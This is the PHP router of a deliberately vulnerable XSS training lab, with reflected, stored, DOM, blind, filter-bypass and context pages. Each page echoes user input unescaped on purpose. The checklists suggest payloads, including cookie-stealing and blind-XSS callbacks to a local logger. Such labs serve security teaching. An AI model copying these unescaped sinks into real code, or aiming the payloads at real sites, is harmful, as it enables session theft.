<?php
// index.php - XSS teaching lab (single-file router)
require_once __DIR__ . '/init_db.php';
$dbfile = __DIR__ . '/db.sqlite';
$db = new PDO('sqlite:' . $dbfile);
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

$page = $_GET['page'] ?? 'home';

// server-side basic filter levels for the Filter Lab
function filter_input_level($input, $level){
    if ($level === 'none') return $input;
    if ($level === 'naive') {
        // naive strip of <script> tags and common event handlers
        $out = preg_replace('#<\s*script[^>]*>(.*?)<\s*/\s*script>#is','',$input);
        $out = preg_replace('#on[a-z]+\s*=\s*["\'].*?["\']#is','',$out);
        return $out;
    }
    if ($level === 'strip_tags') {
        return strip_tags($input);
    }
    if ($level === 'encode') {
        return htmlspecialchars($input, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    }
    if ($level === 'regex') {
        // remove <, > and javascript: pseudo-protocol occurrences
        $out = preg_replace('/<|>|javascript:/i','',$input);
        return $out;
    }
    // default fallback
    return $input;
}

// helper for rendering header
function header_html($title='XSS Lab', $active='home'){
    echo '<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>'.htmlspecialchars($title).'</title>';
    echo '<link rel="stylesheet" href="styles.css">';
    echo '</head><body>';
    echo '<div class="container">';
    // sidebar
    echo '<div class="sidebar card">';
    echo '<div class="logo">The XSS Rat — XSS Lab</div>';
    echo '<div class="sidebar-intro small">Pick a track to explore a specific XSS vector. Each lab walks you through reconnaissance, exploitation and reflection steps.</div>';
    $tabs = ['home'=>'Home overview','reflected'=>'Reflected XSS','stored'=>'Stored XSS','dom'=>'DOM XSS','blind'=>'Blind XSS','filter'=>'Filter lab','contexts'=>'Contexts explorer','bypasses'=>'Bypass library'];
    foreach ($tabs as $k=>$v){
        $classes = 'nav-item button';
        if ($k === $active) {
            $classes .= ' is-active';
        }
        echo '<div><a class="'.$classes.'" href="#" data-page="'.htmlspecialchars($k).'">'.htmlspecialchars($v).'</a></div>';
    }
    echo '<div class="small" style="margin-top:12px">Warning: intentionally vulnerable. Run locally.</div>';
    echo '</div>'; // sidebar end
    echo '<div>'; // main
    echo '<div class="card">';
    echo '<div class="lab-title">'.htmlspecialchars($title).'</div>';
}

// footer
function footer_html(){
    echo '</div>'; // card
    echo '</div>'; // main
    echo '</div>'; // container
    echo '<script src="app.js"></script>';
    echo '</body></html>';
}

// ROUTES
if ($page === 'home'){
    header_html('Home — XSS Lab', 'home');
    echo '<div class="hero">';
    echo '<div class="hero-title">Become confident with XSS by following guided labs.</div>';
    echo '<div class="hero-body small">Each module provides context, a step-by-step checklist and a vulnerable playground so you can practice exploitation safely.</div>';
    echo '</div>';
    echo '<div class="lab-grid">';
    $cards = [
        ['reflected','Reflected XSS','Spot input parameters that echo immediately and craft payloads that execute on first load.'],
        ['stored','Stored XSS','Persist malicious markup inside databases or comments and watch it execute for every visitor.'],
        ['dom','DOM XSS','Manipulate client-side JavaScript sinks such as <code>innerHTML</code> and URL fragments.'],
        ['blind','Blind XSS','Plant payloads that phone home to the blind logger to prove execution in remote panels.'],
        ['filter','Filter Lab','Experiment with increasingly strict server-side filters and learn reliable bypasses.'],
        ['contexts','Contexts','See how the same payload behaves in HTML, attributes, JS, CSS and URL contexts.'],
        ['bypasses','Bypasses','Browse a curated list of payloads ranked from beginner friendly to advanced evasions.'],
    ];
    foreach ($cards as $card){
        echo '<a class="lab-card" href="#" data-page="'.htmlspecialchars($card[0]).'"><div class="lab-card-title">'.htmlspecialchars($card[1]).'</div><div class="lab-card-body small">'.$card[2].'</div><div class="lab-card-action">Start lab →</div></a>';
    }
    echo '</div>';
    echo '<div class="meta meta-columns">';
    echo '<div><strong>How to use these labs</strong><ol class="lab-steps"><li>Read the scenario to understand the application behaviour.</li><li>Use the checklist to experiment and note the results.</li><li>Capture payloads that work so you can reuse them later.</li></ol></div>';
    echo '<div><strong>Recommended toolkit</strong><ul class="lab-list"><li>Browser devtools (network + console)</li><li>Interception proxy (Burp, OWASP ZAP)</li><li>Custom payload scratchpad</li></ul></div>';
    echo '</div>';
    footer_html();
    exit;
}

if ($page === 'reflected'){
    header_html('Reflected XSS', 'reflected');
    echo '<div class="section"><div class="section-title">Mission brief</div><div class="small">Classic reflected XSS happens when user input is immediately returned in the HTTP response. Use the form below to trace the data flow and capture a working payload.</div></div>';
    echo '<div class="section"><div class="section-title">Checklist</div><ol class="lab-steps"><li>Map the reflected parameter using ?page=reflected&amp;q=test and observe the response.</li><li>Confirm raw HTML injection by attempting harmless tags like <code>&lt;em&gt;</code>.</li><li>Escalate to JavaScript execution with <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> or event handler payloads.</li><li>Experiment with filter bypasses such as breaking out of attributes or using <code>&lt;img src onerror=alert(1)&gt;</code>.</ol></div>';
    // echo back GET param 'q' unsafely
    $q = $_GET['q'] ?? '';
    echo '<form method="GET" action="?"><input type="hidden" name="page" value="reflected">';
    echo '<div class="form-row"><input class="input" name="q" data-field="q" placeholder="Enter text to reflect"><span class="input-hint">Tip: start simple, then move to payloads.</span></div>';
    echo '<div class="form-row"><button class="button">Submit &amp; observe response</button></div>';
    echo '</form>';
    echo '<div class="meta"><div class="meta-item" data-field="q"><strong>Reflected input</strong><div class="small">The value of <code>q</code> is injected directly into the DOM without encoding. Any HTML/JS you submit will render immediately.</div><div class="callout">Track the request in your proxy to practice identifying vulnerable parameters in the wild.</div></div></div>';
    echo '<div class="results"><div class="results-title">Raw response fragment</div><div class="results-body">';
    // intentionally vulnerable echo
    echo $q;
    echo '</div></div>';
    footer_html();
    exit;
}

if ($page === 'stored'){
    header_html('Stored XSS', 'stored');
    echo '<div class="section"><div class="section-title">Mission brief</div><div class="small">Stored (persistent) XSS abuses server-side storage such as databases or comment systems. Inputs are saved and replayed to all viewers without sanitisation.</div></div>';
    echo '<div class="section"><div class="section-title">Checklist</div><ol class="lab-steps"><li>Publish a benign message and verify it appears below.</li><li>Inject HTML to validate that markup is preserved in storage.</li><li>Store a script payload so it runs when the page renders.</li><li>Refine your payload to steal cookies or demonstrate impact via the console.</li></ol></div>';
    // handle posting messages into sqlite
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['title'])){
        $st = $db->prepare('INSERT INTO stored_messages (title, body) VALUES (:t,:b)');
        $st->execute([':t'=>$_POST['title'], ':b'=>$_POST['body']]);
        echo '<div class="notice success">Entry stored! Scroll down to see it render unsafely.</div>';
    }
    echo '<form method="POST" action="?page=stored">';
    echo '<div class="form-row"><input class="input" name="title" data-field="title" placeholder="Message title"><span class="input-hint">Example: Friendly greeting</span></div>';
    echo '<div class="form-row"><textarea class="input" name="body" data-field="body" placeholder="Message body (try XSS payloads)" rows="4"></textarea><span class="input-hint">Payload idea: &lt;script&gt;alert(document.cookie)&lt;/script&gt;</span></div>';
    echo '<div class="form-row"><button class="button">Save message</button></div>';
    echo '</form>';
    echo '<div class="meta"><div class="meta-item" data-field="body"><strong>Stored messages</strong><div class="small">Messages are stored in SQLite and printed back without sanitisation. Anyone viewing this list will execute your payload.</div><div class="callout">Try automating with curl to simulate a worm dropping multiple entries.</div></div></div>';
    echo '<div class="results">';
    $rows = $db->query('SELECT id,title,body,created_at FROM stored_messages ORDER BY id DESC LIMIT 30')->fetchAll(PDO::FETCH_ASSOC);
    foreach ($rows as $r){
        echo '<div style="border-bottom:1px solid rgba(255,255,255,0.02);padding:8px;margin-bottom:8px">';
        echo '<div class="small">#'.intval($r['id']).' - '.htmlspecialchars($r['created_at']).' - <strong>'.htmlspecialchars($r['title']).'</strong></div>';
        // UNSAFE: render body raw to demonstrate XSS
        echo '<div style="margin-top:6px">'. $r['body'] .'</div>';
        echo '</div>';
    }
    echo '</div>';
    footer_html();
    exit;
}

if ($page === 'dom'){
    header_html('DOM XSS', 'dom');
    // example using location.hash insertion into innerHTML
    echo '<div class="section"><div class="section-title">Mission brief</div><div class="small">DOM-based XSS executes entirely in the browser when JavaScript reads untrusted data and writes it to a sink without sanitising.</div></div>';
    echo '<div class="section"><div class="section-title">Checklist</div><ol class="lab-steps"><li>Review the inline script to identify the sink (<code>innerHTML</code>).</li><li>Modify the hash using the control below or straight in the URL bar.</li><li>Observe how the sink renders decoded content from <code>location.hash</code>.</li><li>Deliver payloads such as <code>#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E</code> and watch them fire.</li></ol></div>';
    echo '<div class="form-row"><input class="input" id="dom-input" data-field="dom-input" placeholder="Change the URL hash or try a payload"><span class="input-hint">Hint: hashes are URL encoded. Use %3C for &lt;.</span></div>';
    echo '<div class="form-row"><button class="button" onclick="location.hash = document.getElementById(\'dom-input\').value">Set hash</button></div>';
    echo '<div class="meta"><div class="meta-item" data-field="dom-input"><strong>DOM sink</strong><div class="small">The script listens to <code>hashchange</code> and writes the decoded hash straight into <code>innerHTML</code>.</div><div class="callout">Open DevTools → Sources to inspect the live JavaScript as you test payloads.</div></div></div>';
    echo '<div class="results"><div class="results-title">Rendered hash content</div><div id="dom-sink" class="results-body">Hash will be shown here</div></div>';
    echo '<script>
(function(){
  var el = document.getElementById("dom-sink");
  // intentionally unsafe: writes location.hash into innerHTML
  function render(){ el.innerHTML = location.hash ? decodeURIComponent(location.hash.substring(1)) : "(no hash)"; }
  window.addEventListener("hashchange", render);
  render();
})();
</script>';
    footer_html();
    exit;
}

if ($page === 'blind'){
    header_html('Blind XSS', 'blind');
    echo '<div class="section"><div class="section-title">Mission brief</div><div class="small">Blind XSS payloads execute on a separate system (e.g. admin panel) and cannot be observed directly. Instead, the payload must exfiltrate to a controlled endpoint like the logger below.</div></div>';
    echo '<div class="section"><div class="section-title">Checklist</div><ol class="lab-steps"><li>Craft a payload that makes an outbound request to <code>/blind_logger.php</code>.</li><li>Deliver the payload to a hypothetical support system or admin portal.</li><li>Monitor the log to confirm when an unsuspecting victim loads it.</li><li>Extract contextual data (cookies, DOM, CSRF tokens) in the payload and send them to the logger.</li></ol></div>';
    echo '<form method="GET" action="?page=blind"><div class="form-row"><input class="input" name="payload" data-field="payload" placeholder="Example: &lt;img src=\'/blind_logger.php?p=1\'&gt;"><span class="input-hint">Try using fetch or new Image() for stealth.</span></div><div class="form-row"><button class="button">Preview payload</button></div></form>';
    $payload = $_GET['payload'] ?? '';
    if ($payload){
        echo '<div class="meta"><strong>Payload</strong><div class="small">Use this payload on the target application. When executed, it will call back to the logger below.</div><div class="callout">Shareable payload idea: <code>&lt;script&gt;new Image().src="/blind_logger.php?p="+encodeURIComponent(document.cookie)&lt;/script&gt;</code></div></div>';
        echo '<div class="results"><div class="results-title">Payload preview</div><div class="bypass-list">'.htmlspecialchars($payload).'</div></div>';
    }
    echo '<div style="margin-top:12px" class="card"><div class="section-title">Recent blind hits</div><div class="small">Each entry represents an HTTP request made by a victim’s browser when your payload executed.</div>';
    $rows = $db->query('SELECT id,created_at,remote_addr,user_agent,params FROM blind_hits ORDER BY id DESC LIMIT 30')->fetchAll(PDO::FETCH_ASSOC);
    foreach ($rows as $r){
        echo '<div style="border-top:1px solid rgba(255,255,255,0.02);padding:8px;margin-top:8px"><div class="small">#'.intval($r['id']).' '.htmlspecialchars($r['created_at']).' from '.htmlspecialchars($r['remote_addr']).'</div>';
        echo '<div class="small">UA: '.htmlspecialchars($r['user_agent']).'</div>';
        echo '<div class="bypass-list">'.htmlspecialchars($r['params']).'</div></div>';
    }
    echo '</div>';
    footer_html();
    exit;
}

if ($page === 'filter'){
    header_html('Filter Lab', 'filter');
    echo '<div class="section"><div class="section-title">Mission brief</div><div class="small">Use the filter lab to understand how different server-side defences behave. Submit payloads and compare the raw, filtered and rendered output.</div></div>';
    echo '<div class="section"><div class="section-title">Checklist</div><ol class="lab-steps"><li>Select a filter level to see how it transforms your input.</li><li>Test known payloads from the bypass library against each level.</li><li>Document which encodings or transformations defeat the filter.</li><li>Consider the impact if the filtered output is placed into various contexts.</li></ol></div>';
    $level = $_GET['level'] ?? 'none';
    $input = $_POST['input'] ?? null;
    echo '<form method="POST" action="?page=filter&level='.urlencode($level).'">';
    echo '<div class="form-row"><label class="small">Filter level:</label><select name="level_select" onchange="this.form.submit()"><option value="none" '.($level==='none'?'selected':'').'>none (vulnerable)</option><option value="naive" '.($level==='naive'?'selected':'').'>naive (strip &lt;script&gt; and on* handlers)</option><option value="strip_tags" '.($level==='strip_tags'?'selected':'').'>strip_tags()</option><option value="regex" '.($level==='regex'?'selected':'').'>regex (remove &lt; &gt; and javascript:)</option><option value="encode" '.($level==='encode'?'selected':'').'>encode (htmlspecialchars)</option></select><span class="input-hint">Changes auto-submit so you can compare levels quickly.</span></div>';
    echo '</form>';
    // accept input and show before/after and render result sink
    echo '<form method="POST" action="?page=filter&level='.urlencode($level).'"><div class="form-row"><textarea class="input" name="input" data-field="filter-input" rows="4" placeholder="Try payloads here"></textarea><span class="input-hint">Try: &lt;svg onload=alert(1)&gt;</span></div><div class="form-row"><button class="button">Run through filter</button></div></form>';
    if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['input'])){
        $lvl = $_GET['level'] ?? 'none';
        // respect selection change via form that set level_select
        if (!empty($_POST['level_select'])) $lvl = $_POST['level_select'];
        $raw = $_POST['input'];
        $filtered = filter_input_level($raw, $lvl);
        echo '<div class="meta"><strong>Server-side filter applied:</strong> '.htmlspecialchars($lvl).'<div class="callout">Does the filtered result still execute? Use the rendered sink to confirm.</div></div>';
        echo '<div class="results"><div class="results-title">Analysis</div><div class="analysis-grid">';
        echo '<div><div class="analysis-label">Raw input</div><div class="bypass-list">'.htmlspecialchars($raw).'</div></div>';
        echo '<div><div class="analysis-label">Filtered output</div><div class="bypass-list">'.htmlspecialchars($filtered).'</div></div>';
        echo '</div>';
        echo '<div class="results-sink"><div class="analysis-label">Rendered sink (unsafe)</div><div class="sink-output">';
        // intentionally render filtered output without encoding to show bypasses
        echo $filtered;
        echo '</div></div></div>';
    }
    footer_html();
    exit;
}

if ($page === 'contexts'){
    header_html('XSS Contexts Explorer', 'contexts');
    echo '<div class="section"><div class="section-title">Mission brief</div><div class="small">Payload behaviour changes depending on the surrounding context. Use this explorer to see how the same string behaves in multiple locations.</div></div>';
    echo '<div class="section"><div class="section-title">Checklist</div><ol class="lab-steps"><li>Input a payload that mixes quotes, tags and JavaScript.</li><li>Note which contexts render, escape or break on your payload.</li><li>Adjust encoding to target specific contexts (attribute vs. JS string etc.).</li><li>Record working variants for future engagements.</li></ol></div>';
    // contexts: html body, attribute, js string, url param, style
    echo '<form method="GET" action="?page=contexts">';
    echo '<div class="form-row"><input class="input" name="c" data-field="contexts-input" placeholder="Payload to test (e.g. \'\' onmouseover=alert(1) )"><span class="input-hint">Try combining quotes to break attributes and strings.</span></div>';
    echo '<div class="form-row"><button class="button">Test contexts</button></div>';
    echo '</form>';
    $c = $_GET['c'] ?? '';
    echo '<div class="context-grid">';
    echo '<div><div class="analysis-label">HTML body</div><div class="results">'. $c .'</div><div class="context-note small">Rendered with no encoding. Perfect for testing straight injections.</div></div>';
    echo '<div><div class="analysis-label">HTML attribute</div><div class="results"><div><button '.$c.'>Example button</button></div></div><div class="context-note small">Break out of the attribute with quotes or angle brackets.</div></div>';
    echo '<div><div class="analysis-label">JavaScript string</div><div class="results"><script>var s = "'.str_replace('"','\"',$c).'";console.log(s);</script><div class="small">(Check the console to confirm execution)</div></div><div class="context-note small">Escape double quotes with \" to stay inside the string.</div></div>';
    echo '<div><div class="analysis-label">URL / href</div><div class="results"><a href="'.htmlspecialchars($c).'">Click me (href)</a></div><div class="context-note small">Try javascript: payloads or protocol-relative URLs.</div></div>';
    echo '<div><div class="analysis-label">CSS</div><div class="results"><div style="width:100%;height:30px;'.htmlspecialchars($c).'">Box</div></div><div class="context-note small">Some browsers execute JavaScript via CSS expressions in legacy modes.</div></div>';
    echo '</div>';
    echo '</div>';
    footer_html();
    exit;
}

if ($page === 'bypasses'){
    header_html('Filter bypasses (examples increasing difficulty)', 'bypasses');
    // load bypass file
    $bf = __DIR__ . '/bypasses.txt';
    $content = is_file($bf) ? file_get_contents($bf) : 'No bypass file found.';
    echo '<div class="section"><div class="section-title">Mission brief</div><div class="small">A grab bag of payloads for when filters attempt to block scripts. Start with the basics then escalate to more obscure vectors.</div></div>';
    echo '<div class="section"><div class="section-title">How to practice</div><ol class="lab-steps"><li>Load a filter level in the Filter Lab.</li><li>Work down the list until one executes.</li><li>Note why it worked (protocol change, event handler, SVG, etc.).</li><li>Craft your own variant and append it to the list for future runs.</li></ol></div>';
    echo '<div class="results bypass-list" style="margin-top:10px">'.htmlspecialchars($content).'</div>';
    footer_html();
    exit;
}

// default fallback
header_html('Unknown', $page);
echo '<div class="small">Unknown page.</div>';
footer_html();
